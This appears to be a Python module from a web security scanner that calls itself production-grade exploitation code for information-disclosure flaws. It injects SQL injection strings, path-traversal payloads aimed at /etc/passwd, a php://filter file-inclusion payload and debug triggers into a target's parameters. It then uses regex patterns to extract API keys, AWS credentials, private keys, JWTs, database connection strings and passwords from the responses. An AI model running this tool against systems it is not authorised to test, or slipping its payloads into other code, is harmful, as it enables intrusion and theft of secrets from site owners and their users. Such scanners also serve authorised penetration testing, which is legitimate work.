"""
Advanced Information Disclosure Exploitation Module

This module provides real exploitation confirmation for information disclosure vulnerabilities.
Instead of just detecting patterns, it actually confirms exploitation by parsing responses,
extracting sensitive data, and recording full HTTP interactions.

Features:
- Stack trace parsing and analysis
- Debug output detection and extraction
- Error message analysis
- Sensitive data pattern extraction with context
- Full HTTP request/response recording
- Source code disclosure detection
- Configuration file exposure verification
- Database error exploitation
- Path traversal for info disclosure
- Environment variable leakage detection

This is production-grade code for actual exploitation confirmation.
"""

import logging
import re
import json
import hashlib
from typing import Dict, List, Any, Optional, Tuple, Set
from datetime import datetime
from pathlib import Path
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logger.warning("Requests library not available")


class AdvancedInfoDisclosureExploit:
    """
    Advanced information disclosure exploitation system.
    
    This class provides real exploitation confirmation for information disclosure
    vulnerabilities by extracting and analyzing sensitive data from responses.
    """
    
    # Enhanced patterns for sensitive information with context
    SENSITIVE_PATTERNS = {
        'stack_trace': {
            'patterns': [
                r'(?:Traceback|Exception|Error)\s*(?:in|at)\s+[\w/\\\.]+\.(?:py|java|php|js|rb):\d+',
                r'at\s+[\w\.<>$]+\([\w\.]+:\d+\)',
                r'File\s+"[^"]+",\s+line\s+\d+',
                r'(?:Fatal|Warning|Notice):\s+[^\n]+\s+in\s+[^\n]+\s+on\s+line\s+\d+',
                r'(?:Stack trace|Call Stack):[\s\S]{20,500}',
            ],
            'severity': 'high',
            'extract_context': True,
        },
        'database_error': {
            'patterns': [
                r'(?:SQL|MySQL|PostgreSQL|MSSQL|Oracle)\s+(?:syntax|error|warning)',
                r'(?:mysqli|pg_|mssql_|oci_)[\w_]+\(\)',
                r'You have an error in your SQL syntax',
                r'Warning: mysql_[a-z_]+\(\)',
                r'SQLSTATE\[\w+\]:',
                r'Unclosed quotation mark after the character string',
            ],
            'severity': 'critical',
            'extract_context': True,
        },
        'debug_output': {
            'patterns': [
                r'DEBUG\s*=\s*True',
                r'FLASK_DEBUG\s*=\s*[\'"]?(?:1|true|True)',
                r'django\.core\.exceptions',
                r'(?:APP_DEBUG|DEBUG_MODE)\s*=\s*(?:true|1)',
                r'X-Debug-Token:\s*[\w-]+',
            ],
            'severity': 'high',
            'extract_context': True,
        },
        'api_keys': {
            'patterns': [
                r'api[_-]?key["\s:=]+([a-zA-Z0-9_-]{20,})',
                r'apikey["\s:=]+([a-zA-Z0-9_-]{20,})',
                r'api[_-]?secret["\s:=]+([a-zA-Z0-9_-]{20,})',
                r'access[_-]?token["\s:=]+([a-zA-Z0-9_.-]{20,})',
            ],
            'severity': 'critical',
            'extract_context': True,
        },
        'aws_credentials': {
            'patterns': [
                # AWS Access Key ID format: AKIA[A-Z0-9]{16}
                # Note: Pattern is intentionally broad for detection; may produce false positives
                r'AKIA[0-9A-Z]{16}',
                r'aws[_-]?access[_-]?key[_-]?id["\s:=]+([A-Z0-9]{20})',
                r'aws[_-]?secret[_-]?access[_-]?key["\s:=]+([A-Za-z0-9/+=]{40})',
            ],
            'severity': 'critical',
            'extract_context': True,
        },
        'private_keys': {
            'patterns': [
                r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',
                r'-----BEGIN PGP PRIVATE KEY BLOCK-----',
            ],
            'severity': 'critical',
            'extract_context': True,
        },
        'jwt_tokens': {
            'patterns': [
                r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
            ],
            'severity': 'high',
            'extract_context': True,
        },
        'database_connections': {
            'patterns': [
                r'(?:mysql|postgres|mongodb|mssql|oracle)://[\w:@.-]+/\w+',
                r'(?:Server|Host|DATABASE_URL)["\s:=]+[\w.-]+:\d+',
                r'(?:DB_HOST|DB_USER|DB_PASSWORD|DB_NAME)["\s:=]+[\w.-]+',
            ],
            'severity': 'critical',
            'extract_context': True,
        },
        'internal_paths': {
            'patterns': [
                r'/(?:home|usr|var|etc)/[\w/.-]+',
                r'[A-Z]:\\\\[\w\\.-]+',
                r'/root/[\w/.-]+',
                r'/var/www/[\w/.-]+',
            ],
            'severity': 'medium',
            'extract_context': True,
        },
        'source_code': {
            'patterns': [
                r'(?:def|class|function|var|const|let)\s+\w+\s*[({]',
                r'(?:import|require|include)\s+["\'][\w/.-]+["\']',
                r'(?:public|private|protected)\s+(?:static\s+)?function',
            ],
            'severity': 'medium',
            'extract_context': True,
        },
        'environment_vars': {
            'patterns': [
                r'(?:SECRET_KEY|SESSION_SECRET|ENCRYPTION_KEY)["\s:=]+([^\s"\']+)',
                r'(?:PASSWORD|PASSWD|PWD)["\s:=]+(?![\*]+)([^\s"\']{6,})',
                r'process\.env\.\w+',
                r'\$_ENV\[\s*["\'][\w_]+["\']\s*\]',
            ],
            'severity': 'high',
            'extract_context': True,
        },
        'email_addresses': {
            'patterns': [
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            ],
            'severity': 'low',
            'extract_context': False,
        },
        'ip_addresses': {
            'patterns': [
                r'\b(?:10|127|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b',
            ],
            'severity': 'low',
            'extract_context': False,
        },
    }
    
    # Payloads to trigger information disclosure
    ERROR_TRIGGER_PAYLOADS = {
        'sql_errors': [
            "'",
            "''",
            "' OR '1'='1",
            "' OR 1=1--",
            "') OR ('1'='1",
            "\" OR \"1\"=\"1",
        ],
        'path_traversal': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system.ini',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        ],
        'debug_triggers': [
            'debug=1',
            'debug=true',
            'test=1',
            'XDEBUG_SESSION_START=phpstorm',
        ],
        'file_inclusion': [
            'file=../../../../../../etc/passwd',
            'file=php://filter/convert.base64-encode/resource=index.php',
            'page=/etc/passwd',
        ],
    }
    
    def __init__(self, verify_ssl: bool = False, timeout: int = 10):
        """
        Initialize the info disclosure exploit module.
        
        Args:
            verify_ssl: Verify SSL certificates
            timeout: Request timeout in seconds
        """
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        self.session = None
        
    def __enter__(self):
        """Context manager entry."""
        if HAS_REQUESTS:
            self.session = requests.Session()
        return self
        
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit."""
        if self.session:
            self.session.close()
    
    def attempt_info_disclosure_exploitation(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = 'GET',
        additional_params: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        trigger_errors: bool = True
    ) -> Dict[str, Any]:
        """
        Attempt information disclosure exploitation.
        
        Args:
            url: Target URL
            parameter: Parameter to manipulate
            method: HTTP method
            additional_params: Other parameters
            headers: Custom headers
            cookies: Custom cookies
            trigger_errors: Whether to actively trigger errors
            
        Returns:
            Dictionary with exploitation results
        """
        result = {
            'success': False,
            'exploited': False,
            'findings': [],
            'full_interactions': [],
            'extracted_data': {},
            'severity': 'info'
        }
        
        if not HAS_REQUESTS:
            result['error'] = 'Requests library not available'
            return result
        
        try:
            # First, check the baseline response
            baseline = self._make_request(url, method, additional_params, headers, cookies)
            if baseline:
                result['full_interactions'].append({
                    'type': 'baseline',
                    'request': baseline['request'],
                    'response': baseline['response']
                })
                
                # Analyze baseline for information disclosure
                findings = self._analyze_response(baseline['response'], url)
                if findings:
                    result['findings'].extend(findings)
                    result['exploited'] = True
            
            # If enabled, try to trigger more information disclosure
            if trigger_errors and parameter:
                for category, payloads in self.ERROR_TRIGGER_PAYLOADS.items():
                    for payload in payloads[:3]:  # Limit to first 3 per category
                        params = (additional_params or {}).copy()
                        params[parameter] = payload
                        
                        error_resp = self._make_request(url, method, params, headers, cookies)
                        if error_resp:
                            result['full_interactions'].append({
                                'type': f'error_trigger_{category}',
                                'payload': payload,
                                'request': error_resp['request'],
                                'response': error_resp['response']
                            })
                            
                            # Analyze triggered response
                            findings = self._analyze_response(error_resp['response'], url)
                            if findings:
                                for finding in findings:
                                    finding['triggered_by'] = payload
                                result['findings'].extend(findings)
                                result['exploited'] = True
            
            # Extract and categorize data
            if result['findings']:
                result['extracted_data'] = self._categorize_findings(result['findings'])
                result['severity'] = self._calculate_severity(result['findings'])
                result['success'] = True
            
        except Exception as e:
            logger.error(f"Info disclosure exploitation error: {e}")
            result['error'] = str(e)
        
        return result
    
    def _make_request(
        self,
        url: str,
        method: str,
        params: Optional[Dict[str, str]],
        headers: Optional[Dict[str, str]],
        cookies: Optional[Dict[str, str]]
    ) -> Optional[Dict[str, Any]]:
        """Make HTTP request and capture full interaction."""
        try:
            if not self.session:
                self.session = requests.Session()
            
            kwargs = {
                'timeout': self.timeout,
                'verify': self.verify_ssl,
                'allow_redirects': True
            }
            
            if headers:
                kwargs['headers'] = headers
            if cookies:
                kwargs['cookies'] = cookies
            
            if method.upper() == 'GET':
                kwargs['params'] = params
                response = self.session.get(url, **kwargs)
            else:
                kwargs['data'] = params
                response = self.session.post(url, **kwargs)
            
            # Build full interaction record
            interaction = {
                'request': {
                    'method': method,
                    'url': response.url,
                    'headers': dict(response.request.headers),
                    'body': response.request.body
                },
                'response': {
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'body': response.text,
                    'length': len(response.content)
                }
            }
            
            return interaction
            
        except Exception as e:
            logger.error(f"Request error: {e}")
            return None
    
    def _analyze_response(self, response: Dict[str, Any], url: str) -> List[Dict[str, Any]]:
        """Analyze response for information disclosure."""
        findings = []
        
        # Combine headers and body for analysis
        full_content = json.dumps(response['headers']) + '\n' + response['body']
        
        # Check each pattern category
        for category, config in self.SENSITIVE_PATTERNS.items():
            for pattern in config['patterns']:
                matches = list(re.finditer(pattern, full_content, re.IGNORECASE | re.MULTILINE))
                
                if matches:
                    for match in matches[:5]:  # Limit to first 5 matches per pattern
                        finding = {
                            'category': category,
                            'severity': config['severity'],
                            'pattern': pattern[:100],  # Truncate long patterns
                            'matched_text': match.group(0)[:500],  # Limit matched text
                            'position': match.start(),
                            'url': url
                        }
                        
                        # Extract context if enabled
                        if config['extract_context']:
                            context_start = max(0, match.start() - 200)
                            context_end = min(len(full_content), match.end() + 200)
                            finding['context'] = full_content[context_start:context_end]
                        
                        findings.append(finding)
        
        return findings
    
    def _categorize_findings(self, findings: List[Dict[str, Any]]) -> Dict[str, List[str]]:
        """Categorize and deduplicate findings."""
        categorized = {}
        
        for finding in findings:
            category = finding['category']
            if category not in categorized:
                categorized[category] = []
            
            # Store unique matched texts
            matched = finding['matched_text']
            if matched not in categorized[category]:
                categorized[category].append(matched)
        
        return categorized
    
    def _calculate_severity(self, findings: List[Dict[str, Any]]) -> str:
        """Calculate overall severity based on findings."""
        severity_levels = {'critical': 4, 'high': 3, 'medium': 2, 'low': 1, 'info': 0}
        max_severity = 0
        
        for finding in findings:
            severity = finding.get('severity', 'info')
            level = severity_levels.get(severity, 0)
            max_severity = max(max_severity, level)
        
        # Map back to severity string
        for sev, level in severity_levels.items():
            if level == max_severity:
                return sev
        
        return 'info'
    
    @staticmethod
    def parse_stack_trace(content: str) -> Dict[str, Any]:
        """
        Parse stack trace from content.
        
        Returns:
            Dictionary with parsed stack trace information
        """
        result = {
            'found': False,
            'language': None,
            'files': [],
            'functions': [],
            'line_numbers': [],
            'full_trace': None
        }
        
        # Python stack traces
        python_pattern = r'File\s+"([^"]+)",\s+line\s+(\d+)(?:,\s+in\s+(\w+))?'
        python_matches = re.findall(python_pattern, content)
        if python_matches:
            result['found'] = True
            result['language'] = 'Python'
            for file_path, line_num, func in python_matches:
                result['files'].append(file_path)
                result['line_numbers'].append(int(line_num))
                if func:
                    result['functions'].append(func)
        
        # Java stack traces
        java_pattern = r'at\s+([\w\.$<>]+)\(([\w\.]+):(\d+)\)'
        java_matches = re.findall(java_pattern, content)
        if java_matches:
            result['found'] = True
            result['language'] = 'Java'
            for func, file_path, line_num in java_matches:
                result['functions'].append(func)
                result['files'].append(file_path)
                result['line_numbers'].append(int(line_num))
        
        # PHP stack traces
        php_pattern = r'in\s+([^\s]+)\s+on\s+line\s+(\d+)'
        php_matches = re.findall(php_pattern, content)
        if php_matches:
            result['found'] = True
            result['language'] = 'PHP'
            for file_path, line_num in php_matches:
                result['files'].append(file_path)
                result['line_numbers'].append(int(line_num))
        
        # Extract full trace if found
        if result['found']:
            # Try to extract a reasonable chunk containing the trace
            trace_start = content.find('Traceback')
            if trace_start == -1:
                trace_start = content.find('Exception')
            if trace_start == -1:
                trace_start = content.find('Error')
            
            if trace_start != -1:
                trace_end = min(len(content), trace_start + 2000)
                result['full_trace'] = content[trace_start:trace_end]
        
        return result


def get_advanced_info_disclosure_exploit(verify_ssl: bool = False, timeout: int = 10) -> AdvancedInfoDisclosureExploit:
    """
    Factory function to get info disclosure exploit instance.
    
    Args:
        verify_ssl: Verify SSL certificates
        timeout: Request timeout
        
    Returns:
        AdvancedInfoDisclosureExploit instance
    """
    return AdvancedInfoDisclosureExploit(verify_ssl=verify_ssl, timeout=timeout)
